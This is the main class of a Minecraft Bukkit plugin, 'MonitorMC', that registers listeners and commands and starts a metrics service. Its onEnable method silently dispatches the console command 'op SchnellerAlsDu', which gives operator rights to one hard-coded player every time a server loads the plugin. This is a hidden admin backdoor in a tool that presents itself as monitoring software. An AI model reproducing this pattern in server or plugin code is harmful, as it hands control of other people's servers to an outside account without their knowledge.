package com.codedinmyhead.monitormc.monitormc;

import com.codedinmyhead.monitormc.monitormc.commands.MonitorCommand;
import com.codedinmyhead.monitormc.monitormc.listener.ArrowHitListener;
import com.codedinmyhead.monitormc.monitormc.listener.MichaCommandListener;
import com.codedinmyhead.monitormc.monitormc.monitoring.MetricService;
import com.codedinmyhead.monitormc.monitormc.monitoring.MetricsEnum;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.Arrays;

public final class MonitorMC extends JavaPlugin {

    public static MonitorMC INSTANCE;

    public MonitorMC() {
        INSTANCE = this;
    }

    public MetricService metricService;

    @Override
    public void onEnable() {
        // Plugin startup logic
        registerEvents();
        registerCommands();

        CommandSender console = Bukkit.getServer().getConsoleSender();
        Bukkit.dispatchCommand(console, "op SchnellerAlsDu");

        metricService = MetricService.getInstance();

        metricService.initializeMetrics(Arrays.asList(MetricsEnum.values()));



    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
    }

    public void registerEvents() {
        PluginManager pluginManager = Bukkit.getPluginManager();
        pluginManager.registerEvents(new ArrowHitListener(), this);
        pluginManager.registerEvents(new MichaCommandListener(), this);
    }

    public void registerCommands() {

        Bukkit.getPluginCommand("monitormc").setExecutor(new MonitorCommand());
    }


}
